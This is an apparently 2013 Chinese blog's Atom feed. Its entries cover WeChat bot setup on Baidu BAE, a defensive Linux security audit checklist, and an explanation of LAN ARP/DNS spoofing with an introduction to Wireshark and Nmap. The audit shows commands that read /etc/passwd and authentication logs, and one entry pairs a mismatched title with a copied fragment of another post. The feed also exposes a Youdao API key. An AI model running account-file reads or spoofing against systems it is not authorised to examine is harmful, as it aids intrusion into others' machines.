@@ -1,0 +1,635 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+ 
+   <title>Goodbai Blog</title>
+   <link href="http://goodbai.com/atom.xml" rel="self" type="application/atom+xml"/>
+   <link href="http://goodbai.com" rel="alternate" type="text/html" />
+   <updated>2013-12-12T20:08:09+08:00</updated>
+   <id>http://goodbai.com</id>
+   <author>
+     <name>Goodbai</name>
+     <email>weibo.com/baigood</email>
+   </author>
+
+   
+   <entry>
+     <title>Usebaebuildwxservice</title>
+     <link href="http://goodbai.com/web/UseBAEBuildWXService.html"/>
+     <updated>2013-09-18T00:00:00+08:00</updated>
+     <summary>当你在公司、在家里抑或咖啡馆连上了一个免费AP，享受互联网冲浪无比畅快的同时，背后可能正有双眼睛在监视着，MM们正在臭美的QQ空间，GG们正浏览的"照片"，甚至是银行卡等帐号信息...这到底是怎么回事？</summary>
+     <id>http://goodbai.com/web/UseBAEBuildWXService</id>
+     <content type="html">&lt;h2 id='bae'&gt;BAE搭建微信公共号&lt;/h2&gt;
+
+&lt;p&gt;搭建mp.weixin认证服务参考：http://blog.sina.com.cn/s/blog_73b905910101a3xk.html 参照上面执行，微信开发者认证，下一步开启消息推送服务。默认的demo修改如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;
+//$wechatObj-&amp;gt;valid();
+$wechatObj-&amp;gt;responseMsg();
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;这时，给公众号发生任意非空内容，将收到回复“Welcome to wechat world!”。如果还是没有收到，或许是你开启了“编辑模式”。&lt;/p&gt;
+
+&lt;h2 id='bae_'&gt;BAE 搭建微信公号自动响应服务&lt;/h2&gt;
+
+&lt;p&gt;计费策略：&lt;a href='http://developer.baidu.com/wiki/index.php?title=docs/cplat/billing'&gt;http://developer.baidu.com/wiki/index.php?title=docs/cplat/billing&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id='id16'&gt;增加翻译功能&lt;/h2&gt;
+
+&lt;h3 id='build_'&gt;Build 翻译&lt;/h3&gt;
+
+&lt;p&gt;http://www.cnblogs.com/mchina/p/3170565.html baidu翻译文档：http://developer.baidu.com/wiki/index.php?title=帮助文档首页/百度翻译/翻译API&lt;/p&gt;
+
+&lt;h3 id='youdao_'&gt;youdao 翻译&lt;/h3&gt;
+
+&lt;p&gt;http://fanyi.youdao.com/openapi?path=data-mode&lt;/p&gt;
+
+&lt;h2 id='id17'&gt;参考&lt;/h2&gt;
+
+&lt;p&gt;google search (天气预报 上海 api) http://www.google.com.hk/search?newwindow=1&amp;amp;safe=strict&amp;amp;client=safari&amp;amp;rls=en&amp;amp;q=%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5+%E4%B8%8A%E6%B5%B7+api&amp;amp;oq=%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5+%E4%B8%8A%E6%B5%B7+api&amp;amp;gs_l=serp.12&amp;#8230;0.0.0.83631886.0.0.0.0.0.0.0.0..0.0&amp;#8230;.0&amp;#8230;1c..26.serp..0.0.0.RRVw2C1mR_w&lt;/p&gt;
+&lt;a href='http://www.weather.com.cn/data/cityinfo/101010100.html'&gt;Beijing&lt;/a&gt;&lt;a href='http://www.weather.com.cn/data/cityinfo/101190401.html'&gt;Suzhou&lt;/a&gt;
+&lt;h2 id='backup'&gt;backup&lt;/h2&gt;
+
+&lt;p&gt;有道翻译API申请成功 API key：2122702772 keyfrom：goodbaiA 创建时间：2013-09-15 网站名称：goodbaiA 网站地址：http://goodbai.duapp.com&lt;/p&gt;</content>
+   </entry>
+   
+   <entry>
+     <title>Quickblogongithubpage</title>
+     <link href="http://goodbai.com/web/QuickBlogOnGithubPage.html"/>
+     <updated>2013-09-16T00:00:00+08:00</updated>
+     <summary>通过定期体检可以发现身体潜藏的疾病，可能操作系统也一样，如果能定期对Linux系统做安全检查，可以使你的系统更加牢固。系统开放了那些端口(服务），是那个程序开的？是否遭受入侵或者攻击？我们下来看看。</summary>
+     <id>http://goodbai.com/web/QuickBlogOnGithubPage</id>
+     <content type="html">&lt;p&gt;如何使用Github Page搭建博客的文章，网上已经很多，图文并茂很是详细。本文重点介绍如何搭建&lt;em&gt;最快&lt;/em&gt;的博客系统&lt;/p&gt;
+
+&lt;h2 id='id15'&gt;常规检查&lt;/h2&gt;
+
+&lt;p&gt;说明：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;第1行，与命令w输出的含义相同&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第2行，进程总数245&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第3行，CPU使用情况，用户态（us）占用率14.3%，内核态占用率3.4(sy)&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第4,5行，内存使用情况，物理内存4G，空闲703M，交换分区大小为0&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第6,7,8行等，进程列表及实时运行状态&lt;/p&gt;
+
+&lt;p&gt;daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync &amp;#8230; &lt;em&gt;test:x:0:1001:cs2c,,,,:/home/test:/bin/bash&lt;/em&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;要特别注意类似test(最后一行）的帐号，这个帐号UID被设为0，意味这个用户权限与root完全相同，而且在Ubuntu下可以直接登陆（Ubuntu下默认是不允许root登陆系统的），非常危险。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo iptstate -C&lt;/code&gt;&lt;/pre&gt;</content>
+   </entry>
+   
+   <entry>
+     <title>Whomovedyourlinuxos</title>
+     <link href="http://goodbai.com/secure/WhoMovedYourLinuxOS.html"/>
+     <updated>2013-08-15T00:00:00+08:00</updated>
+     <summary>通过定期体检可以发现身体潜藏的疾病，可能操作系统也一样，如果能定期对Linux系统做安全检查，可以使你的系统更加牢固。系统开放了那些端口(服务），是那个程序开的？是否遭受入侵或者攻击？我们下来看看。</summary>
+     <id>http://goodbai.com/secure/WhoMovedYourLinuxOS</id>
+     <content type="html">&lt;p&gt;本文内容主要是多年使用Linux过程中，个人的一些积累，这里记录下来，与大家共同学习。文中以Ubuntu-12.10系统举例，但同样适用于其他主流Linux发行版。本文不涉及Intrusion Detection Systems(IDS,入侵检测系统）知识。&lt;/p&gt;
+
+&lt;h2 id='id10'&gt;常规检查&lt;/h2&gt;
+
+&lt;p&gt;系统版本信息&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ lsb_release -a
+LSB Version:	core-2.0-ia32:core-2.0-noarch:core-3.core...
+Distributor ID:	Ubuntu
+Description:	Ubuntu 12.10
+Release:	12.10
+Codename:	quantal&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;系统安装软件包列表&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ rpm -qa                  #Fedora/Redhat系统适用
+
+$ dpkg -l                  #Ubuntu系统适用&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;系统进程运行状态&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ top
+
+1 top - 15:34:24 up 23:44, 10 users,  load average: 0.52, 0.56, 0.59
+2 Tasks: 245 total,   2 running, 241 sleeping,   1 stopped,   1 zombie
+3 %Cpu(s): 14.3 us,  3.4 sy,  0.0 ni, 82.0 id,  0.0 wa,  0.0 hi,  0.3 si,  0.0 st
+4 KiB Mem:   3924136 total,  3220824 used,   703312 free,   296052 buffers
+5 KiB Swap:        0 total,        0 used,        0 free,  1488240 cached
+6
+7   PID USER      PR  NI  VIRT  RES  SHR S  %CPU %MEM    TIME+  COMMAND
+8 14846 good      20   0  733m 158m  43m S  33.8  4.1  71:54.21 firefox
+9  1309 root      20   0 98.6m  29m 6616 S  14.6  0.8  39:01.19 Xorg
+10 ...&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;说明：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;第1行，与命令w输出的含义相同&lt;/li&gt;
+
+&lt;li&gt;第2行，进程总数245&lt;/li&gt;
+
+&lt;li&gt;第3行，CPU使用情况，用户态（us）占用率14.3%，内核态占用率3.4(sy)&lt;/li&gt;
+
+&lt;li&gt;第4,5行，内存使用情况，物理内存4G，空闲703M，交换分区大小为0&lt;/li&gt;
+
+&lt;li&gt;第6,7,8行等，进程列表及实时运行状态&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;系统运行级查看&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ runlevel &lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Redhat/Fedora系统服务管理和配置&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ chkconfig --list&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Redhat/Fedora系统也可以通过ntsysv命令在TUI界面配置服务&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ntsysv&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ubuntu系统服务管理和配置实现特殊，所以Linux通用的服务管理命令chkconfig等不支持，&lt;em&gt;经初步试用发现命令update-rc.d还很初级，可能达不到预期效果&lt;/em&gt;。&lt;/p&gt;
+
+&lt;p&gt;停止ssh服务&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo update-rc.d ssh disable&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;启用ssh服务&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo update-rc.d ssh enable&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;系统访问控制（selinux)，Fedora/Redhat系统Selinux状态查询方法如下(不适用Ubuntu，因没有预装selinux)。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo getenforce&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id='id11'&gt;帐号安全&lt;/h2&gt;
+
+&lt;p&gt;系统用户登陆情况检查&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ w
+ 15:09:17 up 23:18,  4 users,  load average: 0.77, 0.59, 0.63
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+demo     pts/2    192.168.1.100    15:12   1:16   0.30s  0.09s -bash
+gooo     tty7     :0               三15   23:18m 36:49   2.22s gnome-session --session=ubuntu
+gooo     pts/0    :0               三15   23:57   9.24s  9.01s /usr/bin/firefox&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;说明：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;系统当前时间：15:09:17&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;系统已运行时间：23:18&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;系统平均负载：0.77, 0.59, 0.63 （over the last 1, 5 and 15 minutes）&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;已登陆用户：4个&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;demo用户通过网络在图形下的terminal(pts指虚拟终端）登陆，登陆时间15:12，IP地址为192.168.1.100；&lt;/li&gt;
+
+&lt;li&gt;gooo用户的第一个登陆在控制台七(即Ctrl+Alt+F5)，为当前gnome图形桌面的登陆用户；&lt;/li&gt;
+
+&lt;li&gt;gooo用户的第二个登陆在图形下的terminal，正在运行firefox;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;em&gt;注意&lt;/em&gt;：如果发现有不明用户登陆系统，可通过命令&amp;#8221;pkill -kill -t TTYName&amp;#8221;将其踢掉，如踢掉demo用户的命令如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo pkill -kill -t pts/2&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;检查系统中保存帐号列表的文件中是否有异常帐号。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+...
+*test:x:0:1001:cs2c,,,,:/home/test:/bin/bash*&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;要特别注意类似test(最后一行）的帐号，这个帐号UID被设为0，意味这个用户权限与root完全相同，而且在Ubuntu下可以直接登陆（Ubuntu下默认是不允许root登陆系统的），非常危险。&lt;/p&gt;
+
+&lt;p&gt;帐号历史活动记录&lt;/p&gt;
+
+&lt;p&gt;last命令显示系统最近三次用户登陆情况，如果不指定-n参数，默认显示所有。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo last -n 3
+
+用户名    终端         来源                登录时间     - 关闭时间（持续时间）
+gooo     pts/2        192.168.1.100    Thu Aug 15 15:58 - 16:07  (00:08)    
+gooo     tty5                          Thu Aug 15 15:12 - 16:09  (00:57)
+gooo     pts/7        :0               Thu Aug 15 15:06   still logged in&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;lastb命令显示系统最近三次用户登陆失败的情况，如果不指定-n参数，默认显示所有。ubuntu系统下lastb默认不记录通过远程ssh登陆的失败记录，问题还在查找。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo lastb -n 3
+
+用户名    终端         来源                登录时间     - 关闭时间（持续时间）
+UNKNOWN  tty6                          Thu Aug 15 16:04 - 16:04  (00:00)    
+root     tty6                          Thu Aug 15 16:04 - 16:04  (00:00)    &lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;aureport是一个更加强大的系统审计信息查询工具，基于audit daemon，auditd根据配置规则记录相关系统活动，如用户口令修改记录、进程运行记录等信息，通过aureport工具可以查询audit日志。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ man aureport&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id='id12'&gt;网络安全&lt;/h2&gt;
+
+&lt;p&gt;服务端口开放检查&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo netstat -anpt
+
+1  Active Internet connections (servers and established)
+2  Proto Recv-Q Send-Q Local Address         Foreign Address       State       PID/Program name
+3  tcp        0      0 0.0.0.0:22            0.0.0.0:*             LISTEN      825/sshd        
+4  tcp        0      0 127.0.0.1:631         0.0.0.0:*             LISTEN      12489/cupsd     
+5  tcp        1      0 192.168.1.106:45268   91.189.92.11:443      CLOSE_WAIT  
+6  tcp        0      0 192.168.1.106:22      192.168.1.109:42066   ESTABLISHED 24652/sshd: 
+7  tcp        0      0 192.168.1.106:55095   192.168.1.108:22      ESTABLISHED 25221/ssh       
+8  tcp        0      0 192.168.1.106:32872   122.193.23.59:80      TIME_WAIT   -               
+9  tcp        0      0 192.168.1.106:46298   184.25.111.231:80     TIME_WAIT   -               
+10 udp        0      0 0.0.0.0:17500         0.0.0.0:*                         2579/drop
+11 tcp6       0      0 ::1:631               :::*                  LISTEN      12489/cupsd &lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;说明：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;命令说明(A)：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&amp;#8220;-a&amp;#8221; 显示所有；&lt;/li&gt;
+
+&lt;li&gt;&amp;#8220;-n&amp;#8221; IP地址和端口号以数字方式显示，默认为别名方式；&lt;/li&gt;
+
+&lt;li&gt;&amp;#8220;-p&amp;#8221; 显示PID和进程名；&lt;/li&gt;
+
+&lt;li&gt;&amp;#8220;-t&amp;#8221; 显示TCP协议；&lt;/li&gt;
+
+&lt;li&gt;&amp;#8220;-u&amp;#8221; 显示UDP协议。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第3行，&lt;em&gt;sshd服务(进程ID为825)开启了tcp协议的22号端口&lt;/em&gt;，不限制接入IP地址；&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第4行，cupsd服务开启了tcp协议的631端口，限制仅允许本地访问；&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第5行，本机正在访问91.189.92.11的443端口；&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第6行，&lt;em&gt;远程主机192.168.1.109&lt;/em&gt;已经通过ssh服务远程登陆本机（192.168.1.106)；&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第7行，本机已经通过ssh服务远程登陆远程主机192.168.1.109；&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第8,9行，本机正在访问122.193.23.59和184.25.111.231两个网站；&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第10行，&lt;em&gt;未知服务（drop进程，PID2579)&lt;/em&gt;开启了udp协议的17500端口，不限制接入IP地址；&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;第11行，cupsd服务开启了tcp6协议(IPv6协议）的631端口，限制仅允许本地访问；&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;下面是网络链路安全检查&lt;/p&gt;
+
+&lt;p&gt;默认网关检查&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ route -n&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;网络设备节点情况&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ifconfig -a&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;实时网络连接状态和流量情况&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo iptstate -C&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;ARP解析列表缓存显示。如果192.168.1.1是网关IP，而后面的MAC地址与实际不符，那应该是被ARP欺骗了！&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ arp -a
+
+?  (192.168.1.1) at 00:23:9e:xx:xx:xx [ether] on eth0&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;防火墙规则情况&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo iptables --list&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id='id13'&gt;数据安全&lt;/h2&gt;
+
+&lt;p&gt;如果有人入侵了你的系统，修改了系统启动脚本，还替换了一些关键程序来掩盖他的行踪，这该然后办？关键是你还不确定入侵是否发生过。 RPM包完整性校验&lt;/p&gt;
+
+&lt;p&gt;Redhat系列发行版（Fedora/RHEL）提供RPM包数据校验功能，通过文件签名值校验安装到系统中的软件包是否已经被篡改，也可以扫描出非官方发布的软件包。校验系统中所有软件包情况：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ rpm -Va &lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;校验指定指定软件包initscripts：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ rpm -Va initscripts
+
+S.5......  c /etc/rc.d/rc.local&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;上例扫描结果：initscripts包中的文件/etc/rc.d/rc.local与初始版本内容不一致。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;校验指定文件&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ rpm -Vf /bin/netstat&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;DEB包校验&lt;/p&gt;
+
+&lt;p&gt;Ubuntu系统默认不支持系统已安装包的完整性校验（个人结论），网上查到debsums这个包支持。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo apt-get install debsums
+
+$ debsums  sysv-rc           #校验包sysv-rc
+$ debsums                    #校验系统中所有包&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id='id14'&gt;系统日志安全&lt;/h2&gt;
+
+&lt;p&gt;通过分析日志记录是查找系统安全隐患的重要手段，Linux系统下日志默认集中保存在目录/var/log下，下面主要列举几个主要的日志文件。&lt;/p&gt;
+
+&lt;p&gt;用户帐号认证日志，内容包括帐号登陆记录、权限转换（su/sudo)、修改口令等操作。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo vim /var/log/secure   
+
+$ sudo vim /var/log/auth.log        #Ubuntu系统适用&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;系统启动日志(即显示一行行OK的那个画面的内容)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo vim /var/log/boot.log&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;内核启动初始化日志&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo vim /var/log/dmesg&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;系统服务和核心组件日志（如networkmanager/gnome-session等）&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo vim /var/log/messages
+
+$ sudo vim /var/log/syslog          #Ubuntu系统适用&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Xorg图形系统日志&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo vim /var/log/Xorg.0.log&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在线软件包操作日志，内容包括install/remove/update等记录。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo vim /var/log/yum.log          #Fedora/Redhat系统适用
+
+$ sudo vim /var/log/apt.log          #Ubuntu系统适用&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;全文完。&lt;/p&gt;</content>
+   </entry>
+   
+   <entry>
+     <title>Whylansoinsecure</title>
+     <link href="http://goodbai.com/secure/WhyLANSoInsecure.html"/>
+     <updated>2013-08-05T00:00:00+08:00</updated>
+     <summary>当你在公司、在家里抑或咖啡馆连上了一个免费AP，享受互联网冲浪无比畅快的同时，背后可能正有双眼睛在监视着，MM们正在臭美的QQ空间，GG们正浏览的"照片"，甚至是银行卡等帐号信息...这到底是怎么回事？</summary>
+     <id>http://goodbai.com/secure/WhyLANSoInsecure</id>
+     <content type="html">&lt;p&gt;准备该文一段时间了，作为新博客上第一篇文章，甚是费心，待各种小伎俩融汇贯通，才敢来卖弄。如熟悉TCP/IP协议族，则阅读本文比较轻松，如不然则也无大恙，毕竟本文只是笼统介绍局域网安全。&lt;/p&gt;
+
+&lt;h2 id='id1'&gt;局域网安全为何如此不堪&lt;/h2&gt;
+
+&lt;p&gt;首先作几个定义，什么是局域网，什么是地址解析协议，什么是网络安全，下面是个人的理解。&lt;/p&gt;
+
+&lt;h3 id='id2'&gt;局域网的缺陷&lt;/h3&gt;
+
+&lt;p&gt;局域网简称LAN（Local Area Network），对应OSI七层模型的三层以下（一般不含第三层IP层)，两层交换机或者共享式集线器组网，该类设备一般不具有基于IP地址的路由功能，故局域网内各节点间通过MAC地址（网卡物理地址）标识和通信，而MAC地址是由各个节点自行维护，这意味着我说我是谁我就是谁，这可能是局域网脆弱的根本因素。&lt;/p&gt;
+
+&lt;h3 id='id3'&gt;脆弱的地址解析协议&lt;/h3&gt;
+
+&lt;p&gt;地址解析协议之于网络通信，相当于信号灯系统之于公路交通，是用来指示目标和方向的，此一旦混乱，后果可想而知，事实上呢？&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;地址解析协议(ARP)，ARP(Address Resolution Protocol)，当内网节点间（或者是节点与网关间）需要通信时，ARP解析获得目标IP地址对应的MAC地址，通过该MAC地址完成数据包发送。ARP协议是局域网通信的基础，ARP协议是这样工作的：如主机B需要给主机A（IP为192.168.1.100)发送数据，为了知道谁是主机A，首先主机B发送一个广播包给网内所有机器“谁是192.168.1.10”，正常情况其他机器忽略该消息，仅主机A回复“俺就是192.168.1.10”，于是通信就可以开始。至于不正常情况就是本文的主题。&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;域名解析系统(DNS)，互联网上的设备通过IP地址标识，全数子组成的标识不利于人类记忆和处理，域名的出现改变了这种状况，那么域名是如何对应的IP地址的呢，域名服务器（DNS服务器）就是来完成域名和IP地址的互相转换功能。DNS工作原理与ARP类似，区别是DNS通过指定的DNS服务器来查询，DNS服务器一般是安全的（实际上电信运营商等某些权威机构也经常耍流氓），问题是当明文的DNS数据包通过不安全的局域网时，会被篡改。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id='id4'&gt;网络安全分类&lt;/h3&gt;
+
+&lt;p&gt;网络数据安全或许可分为两层：数据安全和链路安全。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;局域网数据安全，数据安全理解为数据包如果被别人获取，包含内容是否可被查看到，没有加密而明文传输的数据包都是非安全的。如SSl/STL协议数据包是安全的，而HTTP数据包一般是非安全的。数据包与协议实现有关，与网络拓扑结构无关。&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;局域网链路安全(PATH)，链路即网络数据包经过路线。如果正常通信过程中数据包有被非授权访问的可能，则认为该网络数据链路是不安全情况，因为数据包有被像嗅探甚至篡改的可能。交换型局域网正常情况是链路安全的（网关欺骗则是非正常情况）；共享式组网的局域网默认下就是链路不安全，该情况下数据包按广播方式发送，同网段内任一节点都可以收到包。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id='id5'&gt;安全形势到底有多严重&lt;/h3&gt;
+
+&lt;p&gt;广域网可以看作是一个大局域网（如大中国局域网），其组织结构与局域网有类似，但也不同，广域网构建在IP协议之上，因此它的安全性相对更好(除非你是电信内部人士，可以通过控制骨干网关键网络设备，代表如上海有线通用户经常被运营商网页弹窗骚扰；或者你有特殊权限可以直接接触到国家骨干网设备，这些控制权普通用户一般很难获得。)，而局域网中因为ARP协议的缺陷（不仅是ARP，应该是整套机制），导致局域网中很容易实现对网络流量的操控，局域网中典型的攻击模式大概是这样：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;第一步先攻击安全链路以获得数据包访问权，如通过ARP欺骗或者DNS欺骗方式改变正常数据包传输链路；&lt;/li&gt;
+
+&lt;li&gt;第二步数据包协议分析，使用抓包软件抓取和分析数据包内容，通过数据包篡改等多种手段最终达成攻击目的。(A)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;现实中贵重物品保存，一会放入保险箱（内容加密），二放在隐蔽的位置（链路隐藏），这样小偷一来发现不了，二来即使发现保险箱没有密码也无法打开，故这种方式相对安全。而这该死的局域网内，你的数据包一内容没有加密，二位置也没有隐藏，何来安全呢？&lt;/p&gt;
+
+&lt;p&gt;不消说掌握高超技术的大牛，就是仅会简单使用几个黑客工具的小菜鸟哥，都能在出租房内盗取几个MM的QQ空间帐号密码什么的。&lt;/p&gt;
+
+&lt;p&gt;局域网通信模型图示:&lt;/p&gt;
+
+&lt;h2 id='id6'&gt;几种常用黑客工具&lt;/h2&gt;
+
+&lt;p&gt;工与善其事，必先利其器。&lt;/p&gt;
+
+&lt;h3 id='wireshark'&gt;Wireshark(抓包利器)&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href='http://www.wireshark.org/'&gt;Wireshark&lt;/a&gt;（前称Ethereal）是一个网络封包分析软件。网络封包分析软件的功能是撷取网络封包，并尽可能显示出最为详细的网络封包资料。Windows下通过&lt;a href='http://www.wireshark.org/download.html'&gt;Download&lt;/a&gt;页面下载安装即可，一般主流Linux发行版官方软件仓库已经集成该软件，可直接安装：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo apt-get install wireshark       #Ubuntu
+$ sudo yum install wireshark           #Fedora/Redhat&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;默认wireshark运行需要root权限，忽略警告信息，选择对应的网络节点开始抓包，wireshark提供两种数据包过滤机制：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;抓取时过滤规则，即不符合规则的包直接PASS不会抓取；详细规则使用参考&lt;a href='http://wiki.wireshark.org/CaptureFilters'&gt;CaptureFilters&lt;/a&gt;,下面规则的作用是仅显示由192.168.1.100发出或者发往192.168.1.100的http数据包。 &lt;pre&gt;
+host 192.168.1.100 and port 80
+&lt;/pre&gt;&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;显示时过滤规则，即所有通过指定节点的包都抓取，但仅在界面上显示符合规则的包，详细规则使用参考&lt;a href='http://wiki.wireshark.org/DisplayFilters'&gt;DisplayFilters&lt;/a&gt;，下面规则的作用是仅显示由192.168.1.100发出或者发往192.168.1.100的http数据包。 &lt;pre&gt;
+(http and ip.dst==192.168.1.100 ) or ( http and ip.src==192.168.1.100)
+&lt;/pre&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id='nmap'&gt;Nmap（网络探测工具和安全/端口扫描器）&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href='http://nmap.org/man/zh/'&gt;Nmap&lt;/a&gt;,Linux平台下历史悠久且功能强大的网络探测工具和安全扫描器，支持扫描指定网络内主机列表、扫描指定主机开放端口列表甚至探测出所安装操作系统类型。该工具系统默认集成（支持在线包管理器直接安装）。&lt;/p&gt;
+
